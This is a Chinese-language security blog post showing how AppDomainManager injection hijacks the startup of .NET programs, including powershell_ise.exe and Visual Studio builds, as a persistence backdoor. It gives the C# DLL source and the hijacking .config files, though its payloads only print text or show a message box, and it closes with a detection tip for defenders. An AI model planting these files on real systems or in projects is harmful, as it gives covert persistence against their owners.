---
layout: post
title: Use AppDomainManager to maintain persistence
---

## 0x00 前言
---

从Casey Smith@subTee学到的一个技巧：针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。
如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制。

**学习链接：**

http://subt0x10.blogspot.com/2017/06/attacking-clr-appdomainmanager-injection.html

## 0x01 简介
---

本文将要介绍以下内容：

- 劫持自己开发的.Net程序
- 劫持系统.Net程序powershell_ise.exe
- 一种针对Visual Studio的利用思路


## 0x02 相关概念
---

**CLR：**

全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。

CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：

- 在CLR监视之下运行的程序属于“托管的”（managed）代码
- 不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码

对于在CLR监视之下的程序，程序启动的初始化过程可参考如下链接：

http://mattwarren.org/2017/02/07/The-68-things-the-CLR-does-before-executing-a-single-line-of-your-code/


**值得注意的地方：**

如果能从程序启动的初始化过程中找到一个可供利用的位置，在程序启动之前加载我们自己的代码，那么就可以“滥用”CLR的功能，实现对程序的劫持

**更理想的情况下：**

如果可被劫持的程序是一个系统常用程序，随开机自启动，那么，这个方法就能作为一个持续性后门


下面介绍Casey Smith@subTee分享的后门思路：`AppDomainManager`



## 0x03 劫持自己开发的.Net程序
---

**注：**

代码引用自：http://subt0x10.blogspot.com/2017/06/attacking-clr-appdomainmanager-injection.html

### 1、编写示例程序

使用Visual Studio，选择c#开发环境，新建控制台应用程序，工程名：program，代码如下：

```
using System;

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Inside the App");
    }
}
```

编译生成program.exe

程序运行如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/2-1.png)

### 2、编写payload Dll

选择c#开发环境，新建类库，工程名：DomainManager，代码如下：

```
using System;

namespace DomainManager
{
    public class InjectedDomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            base.InitializeNewDomain(appDomainInfo);
            Console.WriteLine("Blah From AppMgr");
        }
    }
}
```

编译生成DomainManager.dll

### 3、设置AppDomainManager劫持程序启动

将DomainManager.dll放于同级目录

**方法1：**

cmd设置环境变量：

```
set APPDOMAIN_MANAGER_ASM=DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

set APPDOMAIN_MANAGER_TYPE=DomainManager.InjectedDomainManager
```

执行program.exe，通过查看回显，发现DomainManager.dll先于program.exe执行

成功实现劫持，完整操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/2-2.png)

**注：**

注意比较执行顺序

通过cmd设置环境变量的方法只会作用于当前cmd，不够通用

**方法2：**

更加通用的方法：配置config文件

新建program.exe.config，内容如下：

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/>
  </startup>
    <runtime>
      <appDomainManagerType value="DomainManager.InjectedDomainManager" />
      <appDomainManagerAssembly
         value="DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    </runtime>
</configuration>
```

**注：**

config文件命名格式：exe+.config

成功实现劫持，完整操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/2-3.png)

## 0x04 劫持系统.Net程序powershell_ise.exe
---

接下来，需要找到可供利用的系统.Net程序，尝试实现持久性后门

这里选取powershell_ise.exe作为演示

**注：**

powershell_ise.exe：全称Windows PowerShell Integrated Scripting Environment（集成脚本环境）

图形界面，主要用于编写和调试powershell脚本

操作界面如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/3-1.png)

为了便于演示，我们需要修改工程DomainManager，使其在运行时弹框

### 1、添加引用

工程-右键-添加引用，选择System.Windows.Forms

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/3-2.png)

代码修改如下：

```
using System;
using System.Windows.Forms; 
namespace DomainManager
{
    public class InjectedDomainManager : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            base.InitializeNewDomain(appDomainInfo);
            Console.WriteLine("Blah From AppMgr");
            MessageBox.Show("1");
        }
    }
}
```

重新编译生成DomainManager.dll

### 2、测试

劫持program.exe成功，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/3-3.png)

劫持powershell_ise.exe：

**（1）** 测试test目录

将powershell_ise.exe复制到`c:\test`

在同级目录新建powershell_ise.exe.config,config文件可作适当精简，精简后的内容如下：

```
<?xml version="1.0"?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" />
  </startup>
    <runtime>
      <appDomainManagerType value="DomainManager.InjectedDomainManager" />
      <appDomainManagerAssembly value="DomainManager" />
    </runtime>
</configuration>
```

在`c:\test`目录下启动powershell_ise.exe

成功劫持powershell_ise.exe

（2）测试powershell_ise.exe默认目录

路径如下：

`C:\Windows\System32\WindowsPowerShell\v1.0`

需要管理员权限，在默认目录创建劫持文件DomainManager.dll和powershell_ise.exe.config

编译任意powershell脚本，默认启动powershell_ise.exe，成功劫持

完整操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/4-1.gif)

## 0x05 一种针对Visual Studio的利用思路
---

对于Visual Studio的c#工程，在工程目录下默认存在文件App.config，内容如下：

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />
    </startup>
</configuration>
```

如果对其修改，添加劫持功能，那么在编译程序时，也会同步修改bin目录下默认生成的config文件

App.config修改如下：

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />
    </startup>
    <runtime>
      <appDomainManagerType value="DomainManager.InjectedDomainManager" />
      <appDomainManagerAssembly value="DomainManager" />
    </runtime>
</configuration>
```

编译程序，bin目录下的config文件也被修改，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/5-1.png)

如果在bin目录也放置DomainManager.dll，那么在程序启动时会被劫持，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-15/5-2.png)


## 0x06 小结 
---

本文介绍了一种通过修改AppDomainManager实现的被动后门触发机制，分析了利用思路，站在防御者的角度，只需要留意.Net程序同级目录下的config文件就好


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
